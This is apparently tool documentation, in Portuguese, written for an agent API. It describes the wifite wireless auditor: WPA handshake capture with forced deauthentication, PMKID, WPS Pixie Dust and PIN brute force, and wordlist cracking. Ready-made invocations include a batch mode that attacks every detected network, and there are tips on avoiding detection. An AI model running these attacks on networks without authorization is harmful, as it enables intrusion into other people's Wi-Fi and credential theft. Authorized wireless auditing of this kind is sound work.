---
name: "wifite"
description: "Auditor wireless automatizado para Linux. Escaneia redes, prioriza alvos por sinal e executa automaticamente ataques WPA/WPA2 (handshake + PMKID), WEP e WPS (Pixie Dust + PIN brute force). Projetado para minimizar interação do usuário. Deve ser usado apenas em redes autorizadas."
---
# wifite

## Objetivo

O wifite é um auditor wireless totalmente automatizado que orquestra ferramentas como aircrack-ng, reaver, bully e pixiewps para atacar múltiplas redes sem intervenção manual a cada etapa. Ele escaneia o ambiente, classifica alvos por intensidade de sinal e executa a sequência de ataques mais adequada para cada rede detectada.

Capacidades principais:
- Escaneamento automático de redes 2.4GHz e 5GHz
- Ataque WPA/WPA2: captura de handshake com deauth forçada
- Ataque PMKID: sem necessidade de cliente conectado
- Ataque WPS: Pixie Dust e PIN brute force via reaver/bully
- Crack WEP via ARP replay e fragmentation
- Crack offline com wordlists (aircrack-ng, cowpatty, pyrit, hashcat)
- Sessões persistentes: retoma ataques interrompidos

## Endpoint

```
/api/tools/run
```

## Requer target

Opcional. Sem `--bssid` ou `--essid`, o wifite ataca todas as redes detectadas (modo batch). Com `--bssid` ou `--essid`, foca em um alvo específico.

## Pré-requisitos

- Interface wireless com suporte a modo monitor
- aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng)
- reaver (para PIN WPS brute force)
- bully (alternativa ao reaver para WPS)
- pixiewps (para Pixie Dust offline)
- cowpatty, pyrit ou hashcat (opcional, para crack acelerado)
- Python 3.6 ou superior
- Permissões root

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                                        |
|-----------|--------|-------------|------------------------------------------------------------------|
| tool      | string | Sim         | Nome da ferramenta: `"wifite"`                                   |
| options   | string | Sim         | Flags e argumentos passados diretamente ao wifite                |

## Flags Importantes

| Flag                      | Descrição                                                                      |
|---------------------------|--------------------------------------------------------------------------------|
| `--interface wlan0`       | Interface wireless a usar (sem modo monitor — o wifite ativa automaticamente)  |
| `--channel N`             | Limita o scan a um canal específico                                            |
| `--bssid AA:BB:CC:DD`     | Ataca apenas o AP com esse BSSID                                               |
| `--essid "Nome"`          | Ataca apenas a rede com esse ESSID                                             |
| `--wpa`                   | Ataca somente redes WPA/WPA2                                                   |
| `--wps`                   | Ataca somente redes com WPS habilitado                                         |
| `--pmkid`                 | Usa ataque PMKID antes de tentar captura de handshake                          |
| `--dict /path/wordlist`   | Wordlist para crack offline após captura                                       |
| `--crack`                 | Força tentativa de crack imediatamente após captura                            |
| `--kill`                  | Mata processos que conflitam com modo monitor (NetworkManager, wpa_supplicant) |
| `--timeout N`             | Tempo limite (segundos) para cada ataque por rede                              |
| `-x N`                    | Número de pacotes deauth por round                                             |
| `--wpa-strip-handshake`   | Remove beacons/dados desnecessários do arquivo de captura                      |
| `--inf`                   | Modo infinito — nunca para de tentar mesmo após falhas                         |
| `--mac-anonymize`         | Randomiza MAC da interface antes de iniciar                                    |
| `--no-wps`                | Pula redes WPS mesmo se detectadas                                             |

## Exemplos

### Exemplo 1 - Ataque automático em todas as redes detectadas

```json
{
  "tool": "wifite",
  "options": "--interface wlan0 --kill --wpa --dict /usr/share/wordlists/rockyou.txt"
}
```

**Descrição:** Mata processos conflitantes, ativa modo monitor, escaneia todas as redes WPA/WPA2, captura handshakes com deauth automatica e tenta crack com rockyou.txt.

### Exemplo 2 - Ataque focado em BSSID específico com PMKID

```json
{
  "tool": "wifite",
  "options": "--interface wlan0 --bssid AA:BB:CC:DD:EE:FF --channel 6 --pmkid --dict /opt/wordlists/custom.txt --crack"
}
```

**Descrição:** Foca em um único AP, tenta PMKID primeiro (mais rápido, não requer cliente), e faz crack imediato com wordlist customizada.

### Exemplo 3 - Ataque WPS com Pixie Dust

```json
{
  "tool": "wifite",
  "options": "--interface wlan0 --bssid AA:BB:CC:DD:EE:FF --wps --timeout 120"
}
```

**Descrição:** Tenta Pixie Dust e PIN brute force WPS com limite de 2 minutos por tentativa. Eficaz contra roteadores domésticos com WPS vulnerável.

### Exemplo 4 - Modo infinito com anonimização de MAC

```json
{
  "tool": "wifite",
  "options": "--interface wlan0 --essid \"RedeAlvo\" --wpa --pmkid --mac-anonymize --inf --dict /opt/wordlists/big.txt"
}
```

**Descrição:** Randomiza MAC, ataca a rede especificada em modo infinito tentando PMKID e handshake, crack com wordlist grande.

### Exemplo 5 - Scan e captura sem crack (coleta forense)

```json
{
  "tool": "wifite",
  "options": "--interface wlan0 --kill --channel 1,6,11 --timeout 60"
}
```

**Descrição:** Escaneia apenas os canais principais (1, 6, 11), captura handshakes de todas as redes detectadas sem tentar crack. Útil para coleta de dados para analise posterior.

## OPSEC

- O wifite gera tráfego de deautenticação em broadcast — detectável por qualquer WIDS
- O parâmetro `--mac-anonymize` ajuda a dificultar correlação por endereço MAC mas não elimina impressão digital de chipset
- O scan inicial (airodump-ng) é passivo e difícil de detectar, mas a fase de deauth é barulhenta
- Arquivos de captura (.cap) ficam em `./hs/` no diretório atual por padrão — mova para local seguro
- O wifite tenta múltiplos APs sequencialmente em modo batch — alto volume de deauths pode alertar administradores
- Use `--channel` para limitar exposição e focar apenas no alvo autorizado
- Logs detalhados ficam em `wifite.log` no diretório de execução
- AVISO LEGAL: O uso do wifite em redes sem autorização expressa e por escrito do proprietário é crime previsto na Lei 12.737/2012 e legislação equivalente internacional. Use apenas em redes próprias ou com permissão documentada.

## Saída

```
[*] Iniciando wifite 2.7.0
[*] Interface wlan0 -> modo monitor -> wlan0mon
[*] Escaneando redes (Ctrl+C para parar)...

NUM  ESSID              CH  ENC    PWR  WPS  CLIENTES
 1   RedeAlvo           6   WPA2  -42  Sim  3
 2   OutraRede          11  WPA2  -67  Nao  1

[*] Atacando RedeAlvo (AA:BB:CC:DD:EE:FF)
[+] Tentando PMKID...
[+] PMKID capturado! Salvando em ./hs/PMKID_AABBCCDDEEFF.22000
[*] Iniciando crack com rockyou.txt (14.344.391 senhas)...
[+] SENHA ENCONTRADA: senha123 (18s)
[*] Credenciais salvas em cracked.txt
```
